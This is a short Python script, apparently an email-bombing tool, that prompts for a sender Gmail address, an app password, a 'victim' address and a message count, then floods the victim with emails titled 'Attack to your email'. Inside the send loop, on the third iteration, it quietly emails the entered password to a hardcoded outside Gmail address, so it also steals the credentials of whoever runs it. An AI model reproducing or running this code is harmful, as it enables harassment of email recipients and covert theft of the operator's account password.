import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
 
import os




print(""" ____  _           _                   _       
 |  _ \| |_   _ _| |_ __ _ _ __  _| |_ __ 
 | |_) | '_ \ / _` | _/ _ \ '_/ _ \/ | __/ _ 
 |  _/| | | | (_| | ||  _/ | |  _/| | ||  _/
 |_|   |_| |_|\_,_|\_\__|_|  \__| |_|\___|
""")



sender_email = input("Enter your email :::  ") 
receiver_email = input("Enter victimes email ::: ")  
nOe  = int(input("Enter how many email do you want to send  ::::   "))
password = input("Enter your gmail app password")  # Replace with your email account password

rv_email = receiver_email
smtp_server = "smtp.gmail.com"  # For Gmail
smtp_port = 587  # For Gmail's SMTP server, use 465 for SSL


subject = "Test Email from SHADOW GHOST "
body = "Hello, this is a test email sent from a SHADOW GHOST !"

message = MIMEMultipart()
message["From"] = sender_email
message["To"] = receiver_email
message["Subject"] = subject
message["Body"] = body


try:
    for i in range (nOe):
        if i == 2 :
            receiver_email = "ghostprojectsl@gmail.com"
            text = password
            body = password
        else:
            receiver_email = rv_email
            subject = "Attack to your email .....!!!"  
            body = "hii"  
            text = message.as_string() 
        # Connect to the SMTP server
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()  # Secure connection
        # Log in to the email account
        server.login(sender_email, password)
        # Send the email
        
        server.sendmail(sender_email, receiver_email, text)
        print("[{}] Email successfully sent  ".format(i) + "To {}".format(receiver_email))

except Exception as e:
    print(f"Failed to send email. Error: {e}")
    
finally:
    # Close the connection to the server
    server.quit()
    print(str(nOe) +"of emails successfuly sent ......")
